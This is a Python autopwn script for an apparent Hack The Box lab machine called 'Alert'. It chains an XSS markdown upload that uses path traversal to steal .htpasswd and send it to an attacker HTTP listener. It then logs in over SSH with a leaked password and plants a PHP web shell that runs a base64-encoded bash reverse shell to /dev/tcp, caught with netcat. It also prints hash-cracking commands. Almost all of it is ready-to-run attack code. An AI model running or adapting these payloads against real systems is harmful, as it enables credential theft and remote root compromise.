#!/usr/bin/env python3
import argparse
import requests
import threading
import http.server
import socketserver
import urllib.parse
import re, signal, sys, subprocess, os, socket
from time import sleep
from termcolor import cprint

def contr_c(sig, frame):
	print(f"\n[!] Exiting the program...")
	if listener_thread:
		listener_thread.join()
	if tunnel_proc:
		tunnel_proc.terminate()
	sys.exit(1)

signal.signal(signal.SIGINT, contr_c)


def create_pwned_js(target_url, attacker_ip, attacker_port):
	payload = f'''<script>fetch("{target_url}/messages.php?file=../../../../../../..//var/www/statistics.alert.htb/.htpasswd").then(response=>response.text()).then(data=>{{fetch("http://{attacker_ip}:{attacker_port}/?file_content="+encodeURIComponent(data));}});</script>'''
	with open("pwned.md", "w") as f:
		f.write(payload.strip())
		print("[+] pwned.md file generated with JS payload")

def upload_pwnedjs(target_url):
	with open("pwned.md", "rb") as f:
		files = {"file": f}
		try:
			response = requests.post(f"{target_url}/visualizer.php", files=files)
			print(response.text)
			share_url = re.search(r'href="(http://.*?link_share=.*?\.md)"', response.text)

			if share_url:
				final_url = share_url.group(1)
				print(f"[+] Markdown uploaded: {final_url}")
				return final_url
			else:
				print("[-] Failed to extract the shared URL")
				return None

		except requests.RequestException as err:
			print(f"[!] Generic error request {err}")
		
	

def send_pwned_message(target_url, malicious_url):
	data = {
		"email": "test@test.com",
		"message": malicious_url
	}
	try:
		response = requests.post(f"{target_url}/contact.php", data=data)
		if "Message sent successfully" in response.text or response.status_code == 302:
			print("[+] Contact message sent successfully!")
		else:
			print("[-] Failed to send the message")
	except requests.RequestException as err:
		print(f"[!] Generic request error: {err}")


def start_http_server(port, stop_event):
	class CustomHandler(http.server.SimpleHTTPRequestHandler):
		def do_GET(self):
			parsed_path = urllib.parse.urlparse(self.path)
			query = urllib.parse.parse_qs(parsed_path.query)
			if 'file_content' in query:
				raw = query['file_content'][0]
				decoded = urllib.parse.unquote(raw)
				match = re.search(r'(?P<user>[a-zA-Z0-9_]+):(?P<hash>.+)', decoded)
				if match:
					user = match.group("user")
					hashval = match.group("hash")
					cprint("\n[+] Credential received from victim::", "green")
					print(f"    🧑 User: {user}")
					print(f"    🔐 Hash   : {hashval}")
					print("    🧨 Crack it with:\n")
					print(f"        hashcat -m 1600 '{hashval}' rockyou.txt")
					print(f"        john --wordlist=rockyou.txt --format=md5crypt hash.txt\n")
				else:
					print("[!] Response received but no valid hash found")
			self.send_response(200)
			self.end_headers()
			self.wfile.write(b"OK")
			stop_event.set()

	with socketserver.TCPServer(("", port), CustomHandler) as httpd:
		print(f"[+] HTTP server listening on port {port}...")
		while not stop_event.is_set():
			httpd.handle_request()



# ========== PHASE 2: Root Escalation via Internal Service ==========

def establish_port_forwarding(user, ip, password, local_port, remote_port):
	print("[*] Establishing SSH tunnel with port forwarding...")
	cmd = [
		"sshpass", "-p", password,
		"ssh", "-o", "StrictHostKeyChecking=no",
		"-N", f"{user}@{ip}",
		"-L", f"{local_port}:127.0.0.1:{remote_port}"
	]
	try:
		proc = subprocess.Popen(cmd)
		sleep(2)
		print(f"[+] Tunnel established: localhost:{local_port} -> {ip}:{remote_port}")
		return proc
	except Exception as err:
		print("[-] SSH connection failed. Is the password correct?")
		return None


def deploy_shell_php(user, ip, password, tracker_ip, attacker_port):
    print("[*] Connecting via SSH to deploy and execute shell.php...")

    bash_cmd = f"bash -i >& /dev/tcp/{tracker_ip}/{attacker_port} 0>&1"
    bash_b64 = os.popen(f"echo -n '{bash_cmd}' | base64").read().strip()
    payload = f"<?php system(\"echo {bash_b64} | base64 -d | bash\"); ?>"

    full_cmd = f"echo '{payload}' > /opt/website-monitor/config/shell.php"

    cmd = [
        "sshpass", "-p", password,
        "ssh", "-o", "StrictHostKeyChecking=no",
        f"{user}@{ip}",
        full_cmd
    ]

    try:
        subprocess.run(cmd, check=True)
        print("[+] shell.php deployed and executed successfully.")
        print("[*] Check your listener on port", attacker_port)
        return True
    except subprocess.CalledProcessError as err:
        print(f"[-] Failed to deploy and execute shell.php: {err}")
    except Exception as err:
        print(f"[-] SSH connection failed: {err}")
    
    return False


def trigger_shell(local_port):
	print("[*] Triggering shell.php to escalate privileges...")
	try:
		r = requests.get(f"http://localhost:{local_port}/config/shell.php")
		print("[+] Trigger sent. Check your listener for root shell.")
	except Exception as e:
		print(f"[!] Error triggering shell: {e}")



def listen_with_nc(port):
	print(f"[+] Launching netcat listener on port {port}...\n")
	try:
		subprocess.run(["nc", "-lvnp", str(port)])
	except KeyboardInterrupt:
		print("[!] Listener interrupted by user.")
	except Exception as e:
		print(f"[!] Error running netcat: {e}")



def main():
	parser = argparse.ArgumentParser(
		description="🔥 Autopwn HTB - Alert Machine\n\n"
					"Modes:\n"
					"  intrusion : Exploits XSS via malicious .md upload and captures sensitive files\n"
					"  privesc   : Gets a reverse shell as root by deploying a shell via SSH\n",
		formatter_class=argparse.RawTextHelpFormatter
	)

	parser.add_argument("--type-attack",  required=True, choices=["intrusion", "privesc"],
						help="Attack type: 'intrusion' or 'privesc'")
	parser.add_argument("--ip", required=True,
						help="Attacker's IP to receive data (HTTP server or reverse shell)")
	parser.add_argument("--port", type=int, default=8000,
						help="Port for attacker's HTTP listener (intrusion)")
	parser.add_argument("--url", default="http://alert.htb",
						help="Target base URL (only for intrusion, default: http://alert.htb)")
	parser.add_argument("--ssh-pass", help="Password for SSH access as 'albert' -> manchesterunited (required for privesc)")
	parser.add_argument("--ip-victim", default="10.10.11.44",
						help="Victim machine IP (default: 10.10.11.44)")

	args = parser.parse_args()

	# === Phase 1: Initial Intrusion ===
	if args.type_attack == "intrusion":
		print("[*] Running XSS-based intrusion phase...")

		stop_event = threading.Event()
		server_thread = threading.Thread(target=start_http_server, args=(args.port, stop_event))
		server_thread.start()

		create_pwned_js(args.url, args.ip, args.port)
		share_link = upload_pwnedjs(args.url)
		if share_link:
			sleep(2)
			send_pwned_message(args.url, share_link)
			print("[*] Waiting for the target to make the request to the HTTP server...")
			server_thread.join(timeout=20)
		else:
			print("[-] Could not proceed without the shared link")

	# === Phase 2: Privilege Escalation ===
	elif args.type_attack == "privesc":
		print("[*] Running privilege escalation phase...")

		if not args.ssh_pass:
			parser.error("--ssh-pass is required for type-attack=privesc")

		if not args.ip_victim:
			parser.error("--ip-victim is required for type-attack=privesc")


		success = deploy_shell_php("albert", args.ip_victim, args.ssh_pass, args.ip, 4444)
		if not success:
			print("[!] Exploitation aborted due to deployment failure. Is the password correct?")
			sys.exit(1)

		tunnel_proc = establish_port_forwarding("albert", args.ip_victim, args.ssh_pass, 8080, 8080)
		if not tunnel_proc:
			print("[!] Exploitation aborted due to port forwarding failure. Is the password correct?")
			sys.exit(1)

		listener_thread = threading.Thread(target=listen_with_nc, args=(4444,))
		listener_thread.start()

		sleep(5)
		trigger_shell(8080)

		listener_thread.join()
		tunnel_proc.terminate()

		


if __name__ == "__main__":
	main()
